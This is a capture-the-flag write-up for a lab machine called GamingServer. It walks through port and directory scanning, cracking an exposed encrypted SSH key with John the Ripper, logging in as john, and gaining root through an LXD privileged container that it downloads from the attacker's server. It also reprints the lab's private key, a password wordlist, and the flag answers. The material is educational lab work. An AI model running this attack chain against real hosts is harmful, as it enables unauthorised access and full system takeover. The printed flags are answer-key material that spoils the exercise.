# GamingServer

Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system?

---

## Nmap

```bash
nmap -sV -p- -T4 <IP> -vv
```

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

---

## Dirsearch

```bash
dirsearch -u http://<IP>
```

```
200 -  /about.html
200 -  /about.php
200 -  /robots.txt
200 -  /secret/
301 -  /secret  →  http://gaming.thm/secret/
403 -  /server-status
301 -  /uploads  →  http://gaming.thm/uploads/
200 -  /uploads/
```

So let’s go to the website and try the paths above.

<img width="1857" height="980" alt="Screenshot From 2025-09-04 17-36-29" src="https://github.com/user-attachments/assets/a3ded936-9ac6-4cf0-98da-72a4df592b36" />

---

## Robots.txt

In the source code we see a person named john:

```html
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

Inside `robots.txt` we see:

```
user-agent: *
Allow: /
/uploads/
```

That means the `/uploads/` directory likely exists and contains files.

---

## Secret Path

Checking `/secret/`:

<img width="1857" height="980" alt="Screenshot From 2025-09-04 17-41-58" src="https://github.com/user-attachments/assets/25911e0e-2162-442b-b026-371c98d59abc" />

Inside the secret key is:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547

T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
-----END RSA PRIVATE KEY-----
```

This is a private key we can use to SSH, but let’s look around more.

---

## Uploads

Going to `/uploads/`, we find three more items.

One is called `dict.lst`:

```
Spring2017
Spring2016
Spring2015
Spring2014
Spring2013
spring2017
spring2016
spring2015
spring2014
spring2013
Summer2017
Summer2016
Summer2015
Summer2014
Summer2013
summer2017
summer2016
summer2015
summer2014
summer2013
Autumn2017
Autumn2016
Autumn2015
Autumn2014
Autumn2013
autumn2017
autumn2016
autumn2015
autumn2014
autumn2013
Winter2017
Winter2016
Winter2015
Winter2014
Winter2013
winter2017
winter2016
winter2015
winter2014
winter2013
P@55w0rd
P@ssw0rd!
P@55w0rd!
sqlsqlsqlsql
SQLSQLSQLSQL
Welcome123
Welcome1234
Welcome1212
PassSql12
network
networking
networks
test
testtest
testing
testing123
testsql
test-sql3
sqlsqlsqlsqlsql
bankbank
default
test
testing
password2
password
Password1
Password1!
P@ssw0rd
password12
Password12
security
security1
security3
secuirty3
complex1
complex2
complex3
sqlserver
sql
sqlsql
password1
password123
complexpassword
database
server
changeme
change
sqlserver2000
sqlserver2005
Sqlserver
SqlServer
Password1
Password2
P@ssw0rd
P@ssw0rd!
P@55w0rd!
P@ssword!
Password!
password!
sqlsvr
sqlaccount
account
sasa
sa
administator
pass
sql
microsoft
sqlserver
sa
hugs
sasa
welcome
welcome1
welcome2
march2011
sqlpass
sqlpassword
guessme
bird
P@55w0rd!
test
dev
devdev
devdevdev
qa
god
admin
adminadmin
admins
goat
sysadmin
water
dirt
air
earth
company
company1
company123
company1!
company!
secret
secret!
secret123
secret1212
secret12
secret1!
sqlpass123
Summer2013
Summer2012
Summer2011
Summer2010
Summer2009
Summer2008
Winter2013
Winter2012
Winter2011
Winter2010
Winter2009
Winter2008
summer2013
summer2012
summer2011
summer2010
summer2009
summer2008
winter2013
winter2012
winter2011
winter2010
winter2009
winter2008
123456
abcd123
abc
burp
private
unknown
wicked
alpine
trust
microsoft
sql2000
sql2003
sql2005
sql2008
vista
xp
nt
98
95
2003
2008
someday
sql2010
sql2011
sql2009
complex
goat
changelater
rain
fire
snow
unchanged
qwerty
12345678
football
baseball
basketball
abc123
111111
1qaz2wsx
dragon
master
monkey
letmein
login
princess
solo
qwertyuiop
starwars
```

Another file is `manifesto.txt`, which contains *The Hacker Manifesto* by The Mentor (1986).

The last file is just a meme.

<img width="1857" height="980" alt="Screenshot From 2025-09-04 17-47-18" src="https://github.com/user-attachments/assets/7cea0d02-2c7f-44b7-a279-abe7191ed237" />


---

## Cracking the RSA Key

I saved the RSA private key locally as `id_rsa` and made sure the permissions were set:

```bash
chmod 600 id_rsa
```

Since the key was encrypted, I couldn’t use it directly with SSH. To crack it, I needed to extract the hash. On the AttackBox, the `ssh2john` script was located under `/opt/john/`:

```bash
python3 /opt/john/ssh2john.py id_rsa > id_rsa.hash
```

Then I used John the Ripper with the provided password list (`pass.txt`):

```bash
john --wordlist=pass.txt id_rsa.hash
```

John successfully found the passphrase:

```
letmein          (id_rsa)
```

---

## SSH as John

With the cracked passphrase, I could now log in as user john:

```bash
ssh -i id_rsa john@gaming.thm
```

When prompted, I entered the passphrase `letmein` and gained access.

Once in, I got the first flag:

> Q1: User flag
> A1: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

---

## Privilege Escalation

I checked with:

```bash
id
```

Output:

```
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

The `john` user is a member of the **lxd** group, which means we can escalate using LXD containers.

On my AttackBox, I built a minimal Alpine image for LXD and served it over HTTP:

```bash
cd /root
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
sudo ./build-alpine
python3 -m http.server 8000 --bind 0.0.0.0
```

On the target:

```bash
cd /tmp
wget http://10.201.9.89:8000/alpine-v3.22-x86_64-20250904_2340.tar.gz -O alpine.tar.gz
```

I then initialized LXD, imported the image, and created a privileged container:

```bash
lxd init --auto
lxc image import alpine.tar.gz --alias pwnimg
lxc init pwnimg pwnbox -c security.privileged=true
lxc config device add pwnbox hostroot disk source=/ path=/mnt/root recursive=true
lxc start pwnbox
lxc exec pwnbox /bin/sh
```

Inside the container I had root and full access to the host filesystem under `/mnt/root`.

I read the root flag from the host:

```bash
cat /mnt/root/root/root.txt
```

---

## Flags

> Q1: User flag
> A1: a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e

> Q2: Root flag
> A2: 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
